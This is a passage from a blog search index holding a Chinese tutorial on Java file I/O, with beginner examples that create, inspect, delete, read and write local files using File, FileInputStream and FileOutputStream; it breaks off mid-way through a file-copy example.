<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>java基础-IO流</title>
    <link href="/2024/07/23/java%E5%9F%BA%E7%A1%80-IO%E6%B5%81/"/>
    <url>/2024/07/23/java%E5%9F%BA%E7%A1%80-IO%E6%B5%81/</url>
    
    <content type="html"><![CDATA[<h1 id="java基础-IO流"><a href="#java基础-IO流" class="headerlink" title="java基础-IO流"></a>java基础-IO流</h1><h2 id="创建文件的方式"><a href="#创建文件的方式" class="headerlink" title="创建文件的方式"></a>创建文件的方式</h2><h3 id="根据路径创建File对象"><a href="#根据路径创建File对象" class="headerlink" title="根据路径创建File对象"></a>根据路径创建File对象</h3><ul><li>方法<code>new File(String filename)</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateFileByPath</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        createFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\createdbypath.txt&quot;</span>);<br>        <span class="hljs-keyword">try</span>&#123;<br>            file.createNewFile();<br>            System.out.println(<span class="hljs-string">&quot;Create Successfully&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="根据父目录File对象，在子路径创建文件"><a href="#根据父目录File对象，在子路径创建文件" class="headerlink" title="根据父目录File对象，在子路径创建文件"></a>根据父目录File对象，在子路径创建文件</h3><ul><li>方法<code>new File(File parent, String child)</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateFileByParentFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        createFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">parentFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream&quot;</span>);<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(parentFile,<span class="hljs-string">&quot;new.txt&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            file.createNewFile();<br>            System.out.println(<span class="hljs-string">&quot;Create successfully&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="根据父目录路径，在子路径创建文件"><a href="#根据父目录路径，在子路径创建文件" class="headerlink" title="根据父目录路径，在子路径创建文件"></a>根据父目录路径，在子路径创建文件</h3><ul><li>方法<code>new File(String parent, String child)</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateFileByParentPath</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        createFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">parentPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream&quot;</span>;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span> (parentPath,<span class="hljs-string">&quot;new1.txt&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            file.createNewFile();<br>            System.out.println(<span class="hljs-string">&quot;Create Successfully&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="获取文件信息"><a href="#获取文件信息" class="headerlink" title="获取文件信息"></a>获取文件信息</h2><p>在new.txt文件中写入如下内容：</p><p><img src="/2023/04/27/file-upload/30919104519010.png" alt="image-20230919104519010"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetFileInfo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        getFileInfo();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getFileInfo</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\new.txt&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;name: &quot;</span>+file.getName());<br>        System.out.println(<span class="hljs-string">&quot;absolute path: &quot;</span>+file.getAbsolutePath());<br>        System.out.println(<span class="hljs-string">&quot;parent path: &quot;</span>+file.getParent());<br>        System.out.println(<span class="hljs-string">&quot;size: &quot;</span>+file.length());<br>        System.out.println(<span class="hljs-string">&quot;isFile ? &quot;</span>+file.isFile());<br>        System.out.println(<span class="hljs-string">&quot;isDirectory ? &quot;</span>+file.isDirectory());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/30919105132120.png" alt="image-20230919105132120"></p><h2 id="目录-文件操作"><a href="#目录-文件操作" class="headerlink" title="目录&#x2F;文件操作"></a>目录&#x2F;文件操作</h2><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><ul><li>方法<code>file.delete()</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeleteFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        deleteFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteFile</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\new1.txt&quot;</span>);<br>        System.out.println(file.delete()?<span class="hljs-string">&quot;Delete Successfully&quot;</span> : <span class="hljs-string">&quot;Delete Failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="目录删除"><a href="#目录删除" class="headerlink" title="目录删除"></a>目录删除</h3><ul><li>方法<code>file.delete()</code>，只有空的目录可以删除</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeleteDir</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        deleteDir();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteDir</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\fordelete&quot;</span>);<br>        System.out.println(file.delete()?<span class="hljs-string">&quot;success&quot;</span>:<span class="hljs-string">&quot;failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="创建单级目录"><a href="#创建单级目录" class="headerlink" title="创建单级目录"></a>创建单级目录</h3><ul><li>方法<code>file.mkdir()</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateSingleDir</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        createSingleDir();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createSingleDir</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\single&quot;</span>);<br>        System.out.println(file.mkdir()?<span class="hljs-string">&quot;success&quot;</span>:<span class="hljs-string">&quot;failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="创建多级目录"><a href="#创建多级目录" class="headerlink" title="创建多级目录"></a>创建多级目录</h3><ul><li>方法<code>file.mkdirs()</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateMultyDir</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        createMultyDir();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createMultyDir</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\multy\\testdir&quot;</span>);<br>        System.out.println(file.mkdirs()?<span class="hljs-string">&quot;success&quot;</span>:<span class="hljs-string">&quot;failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO流分类"><a href="#IO流分类" class="headerlink" title="IO流分类"></a>IO流分类</h2><table><thead><tr><th>抽象基类</th><th>字节流</th><th>字符流</th></tr></thead><tbody><tr><td>输入流</td><td>InputStream</td><td>Reader</td></tr><tr><td>输出流</td><td>OutputStream</td><td>Writer</td></tr></tbody></table><h2 id="文件流操作"><a href="#文件流操作" class="headerlink" title="文件流操作"></a>文件流操作</h2><h3 id="FileInputStream"><a href="#FileInputStream" class="headerlink" title="FileInputStream"></a>FileInputStream</h3><h4 id="read"><a href="#read" class="headerlink" title="read()"></a>read()</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileInputRead</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        readFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\new.txt&quot;</span>;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">readData</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            fileInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filepath);<br>            <span class="hljs-keyword">while</span>((readData=fileInputStream.read())!=-<span class="hljs-number">1</span>)&#123;<br>                System.out.print((<span class="hljs-type">char</span>)readData);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当read()&#x3D;&#x3D;-1时，代表已经读到了文件的末尾。</p><p>注意：这里输入如果用<code>System.out.println();</code>每个字符都会换行，因此改用<code>System.out.print();</code></p><h4 id="read-byte-d"><a href="#read-byte-d" class="headerlink" title="read(byte[] d)"></a>read(byte[] d)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.lang.String;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileInputRead02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        readFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\new.txt&quot;</span>;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">5</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            fileInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filepath);<br>            <span class="hljs-keyword">while</span> ((readLen=fileInputStream.read(cache))!=-<span class="hljs-number">1</span>)&#123;<br>                System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cache,<span class="hljs-number">0</span>,readLen));<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                fileInputStream.close();<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>byte[5]，这里循环了三次：</p><p><img src="/2023/04/27/file-upload/30919131052896.png" alt="image-20230919131052896"></p><h3 id="FileOutputStream"><a href="#FileOutputStream" class="headerlink" title="FileOutputStream"></a>FileOutputStream</h3><h4 id="write-byte-b"><a href="#write-byte-b" class="headerlink" title="write(byte[] b)"></a>write(byte[] b)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.String;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileOutputWrite01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        writeFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeFile</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\newfile.txt&quot;</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filepath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;test123&quot;</span>;<br>            <span class="hljs-keyword">try</span>&#123;<br>                fileOutputStream.write(content.getBytes());<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                fileOutputStream.close();<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用content.getBytes()将String转为byte数组。</p><h4 id="write-byte-b-int-off-int-len"><a href="#write-byte-b-int-off-int-len" class="headerlink" title="write(byte[] b, int off, int len)"></a>write(byte[] b, int off, int len)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.String;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileOutputWrite02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        writeFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeFile</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filepath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\Ry4n\\Desktop\\java\\java_code\\src\\IOStream\\newfile1.txt&quot;</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hahahahaha&quot;</span>;<br>            fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filepath);<br>            <span class="hljs-keyword">try</span>&#123;<br>                fileOutputStream.write(content.getBytes(),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fileOutputStream.close();<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>fileOutputStream.write(content.getBytes(),0,5);</code>，写入5个字符。</p><h4 id="追加写入"><a href="#追加写入" class="headerlink" title="追加写入"></a>追加写入</h4><p><img src="/2023/04/27/file-upload/30919135722077.png" alt="image-20230919135722077"></p><h3 id="文件拷贝"><a href="#文件拷贝" class="headerlink" title="文件拷贝"></a>文件拷贝</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> IOStream;<br><span 